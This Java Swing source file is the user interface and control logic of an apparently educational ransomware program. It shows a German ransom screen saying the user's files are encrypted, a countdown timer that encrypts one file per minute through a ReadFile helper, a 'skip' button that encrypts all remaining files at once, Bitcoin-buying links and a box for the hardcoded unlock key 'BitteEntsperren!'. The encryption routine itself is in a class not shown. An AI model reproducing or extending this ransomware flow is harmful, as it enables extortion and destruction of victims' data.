/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

package Form;

import Decrypt_Encrypt.ReadFile;
import java.awt.Desktop;
import java.io.IOException;
import static java.lang.Thread.sleep;
import java.net.URI;
import java.net.URISyntaxException;
import java.util.ArrayList;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.JOptionPane;
import javax.swing.JProgressBar;
import javax.swing.ScrollPaneConstants;

/**
 *
 * @author Mohammed Bakroon
 */


public class TimerJframe extends javax.swing.JFrame {

    public int hour;
    public int minute;
    public int second;
    private boolean isStart_timer = false;
    Thread th_startTimer;
    Thread th_SkipTimer;
    ProgBarThread t1, t2, t3, t4, t5;
    ArrayList<progressBar> ProgressBarsArrayList = new ArrayList<progressBar>();
    ArrayList<ProgBarThread> ProgBarThreadsArray = new ArrayList<ProgBarThread>();
    private int numberOfFiles = 5;
    String key = "BitteEntsperren!";
    int index = 0;
    int fileCounter = ReadFile.readFileCountPaths();
    private boolean isEncrypted[] = new boolean[fileCounter];

    /**
     * Creates new form MainMenu
     */
    public boolean showHackBackground = true;

    public TimerJframe() {
        initComponents();
        this.setResizable(false);
        startDecription();
        setTextAria();

    }
    //for Text in JEditorPanel
    public void setTextAria(){
          try {
            jEditorPane1.setPage(getClass().getResource("../HTML/HTML_TimerFram.html"));

        } catch (IOException ex) {
            Logger.getLogger(TimerJframe.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    public void fillZeroPercent() {
        int min = 0;
        int max = 100;
        for (progressBar ProgressBar : ProgressBarsArrayList) {
            ProgressBar.getProgressBar().setMaximum(min);
            ProgressBar.getProgressBar().setMaximum(max);
            ProgressBar.getProgressBar().setValue(0);
        }
    }
    int y = 0;
    Thread tha;

    public void OpenSideBar_ProgressBars() {
        if (y == 0) {
            jScrollPane_ProgressBars.setSize(210, y);

            tha = new Thread() {
                @Override
                public void run() {
                    try {
                        for (int i = 0; i <= y; i++) {
                            tha.sleep(1);
                            jScrollPane_ProgressBars.setSize(210, i);

                        }
                    } catch (Exception e) {
                        JOptionPane.showMessageDialog(null, e);
                    }
                }
            };
            tha.start();
            y = 552;
        }
        jScrollPane_ProgressBars.setVisible(true);
    }

    public progressBar AddProgressBarTojPanel() {
        progressBar b = new progressBar();
        b.buildProgressBar();
        jPanel1.add(b.getProgressBar());
        return b;
    }

    public void StartTimer(int xHour, int yMint, int zSecond, boolean timerStatus) {
        hour = xHour;
        minute = yMint;
        second = zSecond;
        isStart_timer = timerStatus;
        th_startTimer = new Thread() {
            public void run() {
//                try {
//                    sleep(2000);
//                } catch (InterruptedException ex) {
//                    Logger.getLogger(MainMenu.class.getName()).log(Level.SEVERE, null, ex);
//                }
                while (isStart_timer == true) {
                    try {
                        second--;
                        jLabel_seconds.setText(addZeroPading(second));
                        jLabel_minute.setText(addZeroPading(minute));
                        jLabel_hour.setText(addZeroPading(hour));
                        sleep(1000);

                        if (second <= 0) {
                            second = 60;
                            minute--;
                            ReadFile.readFileEncryptOneByOne(key, index);
                            if(index<5){
                                isEncrypted[index] = true;
                                index++; 
                            }
                           
                        }
                        if (minute == 0 && hour > 0) {
                            hour--;
                            minute = 60;
                        }

                        if (hour == 0) {
                            if (minute == 0) {
                                if (second == 1) {
                                    jLabel_seconds.setText("0");
                                    isStart_timer = false;
                                    JOptionPane.showMessageDialog(jPanel_timerBox, "Time is over", "Warning", JOptionPane.QUESTION_MESSAGE);
                                    th_startTimer.stop();
//                                    jPanel_TimerPanel.remove(Submit_Button);
//                                    jPanel_TimerPanel.repaint();
//                                    jPanel_TimerPanel.revalidate();
                                }
                            }
                        }
                    } catch (InterruptedException ex) {
                        Logger.getLogger(TimerJframe.class.getName()).log(Level.SEVERE, null, ex);
                    }

                }
            }
        };
        th_startTimer.start();
    }

    public void startDecription() {
        jPanel_TimerPanel.setVisible(true);
        StartTimer(2, 59, 60, true);
        OpenSideBar_ProgressBars();

        //only one object  -> this object we need it for Multi Thread and Syncronization between Threads
        fillProgressBar progBar = new fillProgressBar();

        for (int i = 0; i < numberOfFiles; i++) {
            //Create New ProgressBar and add it to jScrollPanel.jPanel1
            progressBar b = AddProgressBarTojPanel();
            //Add the ProgressBar to An List to refill them with 100% with SkipTimer
            ProgressBarsArrayList.add(b);
            //For every PrgressBar we need seperate Thread 
            ProgBarThread th = new ProgBarThread(progBar, b.getProgressBar());
//            th.start();
            System.out.println("Thred id: " + th.getId() + "Thread Prio" + th.getPriority());
            //added All Threds for ProgressBars to List to stopp them with SkipTimer
            ProgBarThreadsArray.add(th);
        }
        //by using the forech loop the first ProgressBar will fill 
        //and then jumb to the last one and fill forom botton to top 
//        for (ProgBarThread th : ProgBarThreadsArray) {
//            th.start();
//        }
        //in this case the problem above fixed 
        ProgBarThreadsArray.get(0).start();
        for (int i = ProgBarThreadsArray.size() - 1; i > 0; i--) {
            ProgBarThreadsArray.get(i).start();
        }
    }

    public String addZeroPading(int number) {
        if (String.valueOf(hour).length() == 1) {
            String padded = String.format("%02d", number);
            return padded;
        }
        return null;
    }

    //To Create Progress Bar with min and Max Value
    //alt name ProgBarCreator
    class fillProgressBar {

        //To synchroniuzed Threds , one waite other one 
        //alt name creteProgressBar
        synchronized void startFillprogressBar(JProgressBar pb) {

            int min = 0;
            int max = 100;
            pb.setMaximum(min);
            pb.setMaximum(max);
            pb.setValue(0);

            for (int i = min; i <= max; i++) {
                pb.setValue(i);
                try {
                    // 590milsec to fill the ProgressBar with 100 steps in 1 min
                    //Encrypt_Method
//                    ReadFile.readFileEncryptOneByOne(key, index);
//                    index++;
                    Thread.sleep(590);
                } catch (InterruptedException ex) {
                    Logger.getLogger(TimerJframe.class.getName()).log(Level.SEVERE, null, ex);
                }
            }
        }
    }

    //for every new ProgressBar we need new Thread
    class ProgBarThread extends Thread {

        //object from Class ProgBarCreator to inisialize the Progressbar
        fillProgressBar pb;
        //we need it as placeholder for the Progress Bar in MainForm 
        JProgressBar progBarNo;

        public ProgBarThread(fillProgressBar newPb, JProgressBar progBarNo) {
            this.pb = newPb;
            this.progBarNo = progBarNo;
        }

        public void run() {
            pb.startFillprogressBar(progBarNo);
        }
    }

    /**
     * This method is called from within the constructor to initialize the form.
     * WARNING: Do NOT modify this code. The content of this method is always
     * regenerated by the Form Editor.
     */
    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        MainJPanel = new javax.swing.JPanel();
        jPanel_TimerPanel = new javax.swing.JPanel();
        jScrollPane_ProgressBars = new javax.swing.JScrollPane();
        jPanel1 = new javax.swing.JPanel();
        Submit_Button = new javax.swing.JButton();
        jTextField_decryting = new javax.swing.JTextField();
        Back = new javax.swing.JButton();
        jPanel_timerBox = new javax.swing.JPanel();
        jLabel_hour = new javax.swing.JLabel();
        jLabel_seconds = new javax.swing.JLabel();
        jLabel_minute = new javax.swing.JLabel();
        jLabel_milisecond = new javax.swing.JLabel();
        skipTimer_Button = new javax.swing.JLabel();
        jLabel2 = new javax.swing.JLabel();
        jLabel5 = new javax.swing.JLabel();
        jLabel16 = new javax.swing.JLabel();
        jLabel4 = new javax.swing.JLabel();
        jLabel6 = new javax.swing.JLabel();
        jPanel2 = new javax.swing.JPanel();
        jScrollPane1 = new javax.swing.JScrollPane();
        jEditorPane1 = new javax.swing.JEditorPane();
        jLabel1 = new javax.swing.JLabel();
        jLabel3 = new javax.swing.JLabel();
        jLabel8 = new javax.swing.JLabel();
        jLabel7 = new javax.swing.JLabel();
        jButton_Bitcoin = new javax.swing.JButton();
        jButton_Bitcoinkaufen = new javax.swing.JButton();
        jButton1 = new javax.swing.JButton();
        Background_TimerPanel = new javax.swing.JLabel();
        Hack_background = new javax.swing.JLabel();

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);
        setBackground(new java.awt.Color(255, 255, 255));
        setUndecorated(true);

        MainJPanel.setBackground(new java.awt.Color(204, 204, 255));
        MainJPanel.setMinimumSize(new java.awt.Dimension(1000, 625));
        MainJPanel.setPreferredSize(new java.awt.Dimension(1000, 625));
        MainJPanel.setLayout(new org.netbeans.lib.awtextra.AbsoluteLayout());

        jPanel_TimerPanel.setPreferredSize(new java.awt.Dimension(1000, 625));
        jPanel_TimerPanel.setLayout(new org.netbeans.lib.awtextra.AbsoluteLayout());

        jPanel1.setPreferredSize(new java.awt.Dimension(239, 32000));

        javax.swing.GroupLayout jPanel1Layout = new javax.swing.GroupLayout(jPanel1);
        jPanel1.setLayout(jPanel1Layout);
        jPanel1Layout.setHorizontalGroup(
            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 239, Short.MAX_VALUE)
        );
        jPanel1Layout.setVerticalGroup(
            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 32000, Short.MAX_VALUE)
        );

        jScrollPane_ProgressBars.setViewportView(jPanel1);

        jPanel_TimerPanel.add(jScrollPane_ProgressBars, new org.netbeans.lib.awtextra.AbsoluteConstraints(780, 20, 210, 590));
        jScrollPane_ProgressBars.setHorizontalScrollBarPolicy(ScrollPaneConstants.HORIZONTAL_SCROLLBAR_NEVER);
        jScrollPane_ProgressBars.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_AS_NEEDED);

        Submit_Button.setBackground(java.awt.Color.lightGray);
        Submit_Button.setText("Submit");
        Submit_Button.setCursor(new java.awt.Cursor(java.awt.Cursor.DEFAULT_CURSOR));
        Submit_Button.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseClicked(java.awt.event.MouseEvent evt) {
                Submit_ButtonMouseClicked(evt);
            }
        });
        Submit_Button.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                Submit_ButtonActionPerformed(evt);
            }
        });
        jPanel_TimerPanel.add(Submit_Button, new org.netbeans.lib.awtextra.AbsoluteConstraints(530, 560, 100, 40));

        jTextField_decryting.setBackground(new java.awt.Color(204, 204, 204));
        jTextField_decryting.setHorizontalAlignment(javax.swing.JTextField.CENTER);
        jTextField_decryting.setText("Enter The Secret Key ");
        jTextField_decryting.setCursor(new java.awt.Cursor(java.awt.Cursor.DEFAULT_CURSOR));
        jTextField_decryting.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jTextField_decrytingActionPerformed(evt);
            }
        });
        jPanel_TimerPanel.add(jTextField_decryting, new org.netbeans.lib.awtextra.AbsoluteConstraints(450, 520, 290, 40));

        Back.setText("Zurueck");
        Back.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseClicked(java.awt.event.MouseEvent evt) {
                BackMouseClicked(evt);
            }
        });
        Back.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                BackActionPerformed(evt);
            }
        });
        jPanel_TimerPanel.add(Back, new org.netbeans.lib.awtextra.AbsoluteConstraints(0, 0, -1, -1));

        jPanel_timerBox.setBackground(new java.awt.Color(105, 111, 113));
        jPanel_timerBox.setBorder(javax.swing.BorderFactory.createBevelBorder(javax.swing.border.BevelBorder.RAISED));

        jLabel_hour.setBackground(new java.awt.Color(153, 255, 0));
        jLabel_hour.setFont(new java.awt.Font("Lucida Grande", 0, 24)); // NOI18N
        jLabel_hour.setForeground(new java.awt.Color(255, 255, 255));
        jLabel_hour.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);
        jLabel_hour.setText("00");

        jLabel_seconds.setBackground(new java.awt.Color(153, 255, 0));
        jLabel_seconds.setFont(new java.awt.Font("Lucida Grande", 0, 24)); // NOI18N
        jLabel_seconds.setForeground(new java.awt.Color(255, 255, 255));
        jLabel_seconds.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);
        jLabel_seconds.setText("00");

        jLabel_minute.setBackground(new java.awt.Color(153, 255, 0));
        jLabel_minute.setFont(new java.awt.Font("Lucida Grande", 0, 24)); // NOI18N
        jLabel_minute.setForeground(new java.awt.Color(255, 255, 255));
        jLabel_minute.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);
        jLabel_minute.setText("00");

        jLabel_milisecond.setBackground(new java.awt.Color(153, 255, 0));
        jLabel_milisecond.setFont(new java.awt.Font("Lucida Grande", 0, 24)); // NOI18N
        jLabel_milisecond.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);

        skipTimer_Button.setIcon(new javax.swing.ImageIcon(getClass().getResource("/Icons/icons8-überspringen-50.png"))); // NOI18N
        skipTimer_Button.setCursor(new java.awt.Cursor(java.awt.Cursor.DEFAULT_CURSOR));
        skipTimer_Button.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseClicked(java.awt.event.MouseEvent evt) {
                skipTimer_ButtonMouseClicked(evt);
            }
            public void mousePressed(java.awt.event.MouseEvent evt) {
                skipTimer_ButtonMousePressed(evt);
            }
        });

        jLabel2.setForeground(new java.awt.Color(204, 204, 204));
        jLabel2.setText("Min");

        jLabel5.setForeground(new java.awt.Color(204, 204, 204));
        jLabel5.setText("Hour");

        jLabel16.setForeground(new java.awt.Color(204, 204, 204));
        jLabel16.setText("Second");

        jLabel4.setFont(new java.awt.Font("Lucida Grande", 0, 14)); // NOI18N
        jLabel4.setForeground(new java.awt.Color(255, 255, 0));
        jLabel4.setText("dein Datei werden verschluesselt! ");

        jLabel6.setForeground(new java.awt.Color(255, 255, 255));
        jLabel6.setText("uebrige Zeit");

        javax.swing.GroupLayout jPanel_timerBoxLayout = new javax.swing.GroupLayout(jPanel_timerBox);
        jPanel_timerBox.setLayout(jPanel_timerBoxLayout);
        jPanel_timerBoxLayout.setHorizontalGroup(
            jPanel_timerBoxLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel_timerBoxLayout.createSequentialGroup()
                .addGap(31, 31, 31)
                .addGroup(jPanel_timerBoxLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(jPanel_timerBoxLayout.createSequentialGroup()
                        .addComponent(jLabel4)
                        .addGap(0, 0, Short.MAX_VALUE))
                    .addGroup(jPanel_timerBoxLayout.createSequentialGroup()
                        .addComponent(jLabel_hour)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(jLabel5)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addGroup(jPanel_timerBoxLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addComponent(jLabel6)
                            .addGroup(jPanel_timerBoxLayout.createSequentialGroup()
                                .addGroup(jPanel_timerBoxLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)
                                    .addComponent(skipTimer_Button)
                                    .addGroup(jPanel_timerBoxLayout.createSequentialGroup()
                                        .addComponent(jLabel_minute)
                                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                                        .addComponent(jLabel2)))
                                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                                .addComponent(jLabel_seconds)
                                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                                .addComponent(jLabel16)))
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                        .addComponent(jLabel_milisecond, javax.swing.GroupLayout.PREFERRED_SIZE, 50, javax.swing.GroupLayout.PREFERRED_SIZE)))
                .addContainerGap())
        );
        jPanel_timerBoxLayout.setVerticalGroup(
            jPanel_timerBoxLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, jPanel_timerBoxLayout.createSequentialGroup()
                .addContainerGap()
                .addComponent(jLabel4, javax.swing.GroupLayout.PREFERRED_SIZE, 28, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(jPanel_timerBoxLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(jLabel_milisecond, javax.swing.GroupLayout.PREFERRED_SIZE, 40, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addGroup(jPanel_timerBoxLayout.createSequentialGroup()
                        .addComponent(jLabel6)
                        .addGap(10, 10, 10)
                        .addGroup(jPanel_timerBoxLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                            .addComponent(jLabel_hour)
                            .addComponent(jLabel5)
                            .addComponent(jLabel_minute)
                            .addComponent(jLabel2)
                            .addComponent(jLabel_seconds)
                            .addComponent(jLabel16))))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                .addComponent(skipTimer_Button)
                .addContainerGap(8, Short.MAX_VALUE))
        );

        jPanel_TimerPanel.add(jPanel_timerBox, new org.netbeans.lib.awtextra.AbsoluteConstraints(50, 240, 290, 170));

        String strHTML = "<div style= color:red ; font-size. 40px>Was passiert mit meinem Computer</div>";
        jScrollPane1.setViewportView(jEditorPane1);

        javax.swing.GroupLayout jPanel2Layout = new javax.swing.GroupLayout(jPanel2);
        jPanel2.setLayout(jPanel2Layout);
        jPanel2Layout.setHorizontalGroup(
            jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jScrollPane1, javax.swing.GroupLayout.DEFAULT_SIZE, 400, Short.MAX_VALUE)
        );
        jPanel2Layout.setVerticalGroup(
            jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel2Layout.createSequentialGroup()
                .addComponent(jScrollPane1, javax.swing.GroupLayout.PREFERRED_SIZE, 422, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGap(0, 0, Short.MAX_VALUE))
        );

        jPanel_TimerPanel.add(jPanel2, new org.netbeans.lib.awtextra.AbsoluteConstraints(360, 60, 400, 420));

        jLabel1.setFont(new java.awt.Font("Lucida Grande", 1, 14)); // NOI18N
        jLabel1.setForeground(new java.awt.Color(255, 255, 255));
        jLabel1.setText("Ooops, dein Datei sind verschluesselt!");
        jPanel_TimerPanel.add(jLabel1, new org.netbeans.lib.awtextra.AbsoluteConstraints(400, 20, 280, 20));

        jLabel3.setIcon(new javax.swing.ImageIcon(getClass().getResource("/Icons/lock.jpeg"))); // NOI18N
        jLabel3.setText("jLabel3");
        jLabel3.setBorder(new javax.swing.border.SoftBevelBorder(javax.swing.border.BevelBorder.RAISED));
        jPanel_TimerPanel.add(jLabel3, new org.netbeans.lib.awtextra.AbsoluteConstraints(50, 40, 280, 170));

        jLabel8.setIcon(new javax.swing.ImageIcon(getClass().getResource("/Icons/bitCoin1 copy.jpg"))); // NOI18N
        jLabel8.setText("jLabel8");
        jPanel_TimerPanel.add(jLabel8, new org.netbeans.lib.awtextra.AbsoluteConstraints(360, 510, 90, 90));

        jLabel7.setIcon(new javax.swing.ImageIcon(getClass().getResource("/Icons/istock-846011096-2.jpg"))); // NOI18N
        jLabel7.setText("jLabel7");
        jLabel7.setBorder(new javax.swing.border.SoftBevelBorder(javax.swing.border.BevelBorder.RAISED));
        jPanel_TimerPanel.add(jLabel7, new org.netbeans.lib.awtextra.AbsoluteConstraints(360, 510, 400, 90));

        jButton_Bitcoin.setText("Was ist Bitcoin ?!");
        jButton_Bitcoin.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton_BitcoinActionPerformed(evt);
            }
        });
        jPanel_TimerPanel.add(jButton_Bitcoin, new org.netbeans.lib.awtextra.AbsoluteConstraints(50, 450, 290, 30));

        jButton_Bitcoinkaufen.setText("Wie man Bitcoin kauft ?");
        jButton_Bitcoinkaufen.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton_BitcoinkaufenActionPerformed(evt);
            }
        });
        jPanel_TimerPanel.add(jButton_Bitcoinkaufen, new org.netbeans.lib.awtextra.AbsoluteConstraints(50, 480, 290, 30));

        jButton1.setText("Kostenlose Dateientschluesseln");
        jButton1.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton1ActionPerformed(evt);
            }
        });
        jPanel_TimerPanel.add(jButton1, new org.netbeans.lib.awtextra.AbsoluteConstraints(50, 510, 290, -1));

        Background_TimerPanel.setIcon(new javax.swing.ImageIcon(getClass().getResource("/Icons/timerbackgroundhack copy.gif"))); // NOI18N
        Background_TimerPanel.setText("jLabel3");
        jPanel_TimerPanel.add(Background_TimerPanel, new org.netbeans.lib.awtextra.AbsoluteConstraints(0, 0, 1000, 625));

        MainJPanel.add(jPanel_TimerPanel, new org.netbeans.lib.awtextra.AbsoluteConstraints(0, 0, 1000, 625));

        Hack_background.setIcon(new javax.swing.ImageIcon(getClass().getResource("/Icons/background2.jpg"))); // NOI18N
        MainJPanel.add(Hack_background, new org.netbeans.lib.awtextra.AbsoluteConstraints(0, 0, 1000, 625));

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(MainJPanel, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(MainJPanel, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
        );

        pack();
        setLocationRelativeTo(null);
    }// </editor-fold>//GEN-END:initComponents
//    int x = 210;
//    Thread th;

    private void skipTimer_ButtonMouseClicked(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_skipTimer_ButtonMouseClicked


    }//GEN-LAST:event_skipTimer_ButtonMouseClicked

    private void jTextField_decrytingActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jTextField_decrytingActionPerformed
        // TODO add your handling code here:
    }//GEN-LAST:event_jTextField_decrytingActionPerformed

    private void BackMouseClicked(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_BackMouseClicked
        new MainMenu().setVisible(true);
        for (ProgBarThread th : ProgBarThreadsArray) {
            th.stop();
        }
        th_startTimer.stop();
        progressBar.y = 0;

        this.dispose();
    }//GEN-LAST:event_BackMouseClicked

    private void BackActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_BackActionPerformed
        // TODO add your handling code here:
        ReadFile.readFileToDecrypt(key);
    }//GEN-LAST:event_BackActionPerformed

    private void skipTimer_ButtonMousePressed(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_skipTimer_ButtonMousePressed
        // to be unenabled to clicked the skipTimer Button morthan ones 
        //if that happen it will lead to resume the Thread from the interrupted point
        //and the secound will going under 0
        skipTimer_Button.setEnabled(false);
//        jPanel_timerBox.remove(skipTimer_Button);
        th_startTimer.stop();
        // to kill the thred need sometime for that just sleep for a while      
        try {

            for (ProgBarThread barThread : ProgBarThreadsArray) {
                barThread.stop();
//                System.out.println(barThread.getName() + barThread.getId() + barThread.isAlive());
            }

            sleep(500);
        } catch (InterruptedException ex) {
            Logger.getLogger(MainMenu.class.getName()).log(Level.SEVERE, null, ex);
        }
        StartTimer(0, 0, 10, true);

        int min = 0;
        int max = 100;
        for (progressBar ProgressBar : ProgressBarsArrayList) {
            ProgressBar.getProgressBar().setMaximum(min);
            ProgressBar.getProgressBar().setMaximum(max);
            ProgressBar.getProgressBar().setValue(100);

        }
        for (int i = 0; i < fileCounter; i++) {
            if (isEncrypted[i] == false) {
                ReadFile.readFileEncryptOneByOne(key, i);
            }
        }


    }//GEN-LAST:event_skipTimer_ButtonMousePressed

    private void Submit_ButtonMouseClicked(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_Submit_ButtonMouseClicked
        //Decryption_Method
        for (ProgBarThread barThread : ProgBarThreadsArray) {
            barThread.stop();
        }
        //Stop Timer with Enter Key 
        th_startTimer.stop();
        //Decpytion
        if (evt.getSource() == Submit_Button) {
            String input = jTextField_decryting.getText();
            if (input.equals("BitteEntsperren!")) {
                ReadFile.readFileToDecrypt(input);

            }
        }
        fillZeroPercent();


    }//GEN-LAST:event_Submit_ButtonMouseClicked

    private void Submit_ButtonActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_Submit_ButtonActionPerformed
        // TODO add your handling code here:
      
    }//GEN-LAST:event_Submit_ButtonActionPerformed

    private void jButton_BitcoinActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton_BitcoinActionPerformed
        try {
            Desktop browser = Desktop.getDesktop();
            browser.browse(new URI("https://de.wikipedia.org/wiki/Bitcoin"));
        } catch (URISyntaxException ex) {
            Logger.getLogger(TimerJframe.class.getName()).log(Level.SEVERE, null, ex);
        } catch (IOException ex) {
            Logger.getLogger(TimerJframe.class.getName()).log(Level.SEVERE, null, ex);
        }
    }//GEN-LAST:event_jButton_BitcoinActionPerformed

    private void jButton_BitcoinkaufenActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton_BitcoinkaufenActionPerformed
        try {
            Desktop browser = Desktop.getDesktop();
            browser.browse(new URI("https://www.handelsblatt.com/vergleich/bitcoin-kaufen/"));
        } catch (URISyntaxException ex) {
            Logger.getLogger(TimerJframe.class.getName()).log(Level.SEVERE, null, ex);
        } catch (IOException ex) {
            Logger.getLogger(TimerJframe.class.getName()).log(Level.SEVERE, null, ex);
        }
    }//GEN-LAST:event_jButton_BitcoinkaufenActionPerformed

    private void jButton1ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton1ActionPerformed

    }//GEN-LAST:event_jButton1ActionPerformed

    /**
     * @param args the command line arguments
     */
    public static void main(String args[]) {
        /* Set the Nimbus look and feel */
        //<editor-fold defaultstate="collapsed" desc=" Look and feel setting code (optional) ">
        /* If Nimbus (introduced in Java SE 6) is not available, stay with the default look and feel.
         * For details see http://download.oracle.com/javase/tutorial/uiswing/lookandfeel/plaf.html 
         */
        try {
            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {
                if ("Windows".equals(info.getName())) {
                    javax.swing.UIManager.setLookAndFeel(info.getClassName());
                    break;
                }
            }
        } catch (ClassNotFoundException ex) {
            java.util.logging.Logger.getLogger(TimerJframe.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (InstantiationException ex) {
            java.util.logging.Logger.getLogger(TimerJframe.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (IllegalAccessException ex) {
            java.util.logging.Logger.getLogger(TimerJframe.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (javax.swing.UnsupportedLookAndFeelException ex) {
            java.util.logging.Logger.getLogger(TimerJframe.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        }
        //</editor-fold>
        //</editor-fold>

        /* Create and display the form */
        // JProgressBar-Objekt wird erzeugt
        java.awt.EventQueue.invokeLater(new Runnable() {
            public void run() {
                new TimerJframe().setVisible(true);
            }
        });
    }

    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JButton Back;
    private javax.swing.JLabel Background_TimerPanel;
    private javax.swing.JLabel Hack_background;
    private javax.swing.JPanel MainJPanel;
    private javax.swing.JButton Submit_Button;
    private javax.swing.JButton jButton1;
    private javax.swing.JButton jButton_Bitcoin;
    private javax.swing.JButton jButton_Bitcoinkaufen;
    private javax.swing.JEditorPane jEditorPane1;
    private javax.swing.JLabel jLabel1;
    private javax.swing.JLabel jLabel16;
    private javax.swing.JLabel jLabel2;
    private javax.swing.JLabel jLabel3;
    private javax.swing.JLabel jLabel4;
    private javax.swing.JLabel jLabel5;
    private javax.swing.JLabel jLabel6;
    private javax.swing.JLabel jLabel7;
    private javax.swing.JLabel jLabel8;
    public javax.swing.JLabel jLabel_hour;
    private javax.swing.JLabel jLabel_milisecond;
    public javax.swing.JLabel jLabel_minute;
    public javax.swing.JLabel jLabel_seconds;
    public javax.swing.JPanel jPanel1;
    private javax.swing.JPanel jPanel2;
    private javax.swing.JPanel jPanel_TimerPanel;
    private javax.swing.JPanel jPanel_timerBox;
    private javax.swing.JScrollPane jScrollPane1;
    public javax.swing.JScrollPane jScrollPane_ProgressBars;
    private javax.swing.JTextField jTextField_decryting;
    private javax.swing.JLabel skipTimer_Button;
    // End of variables declaration//GEN-END:variables

}
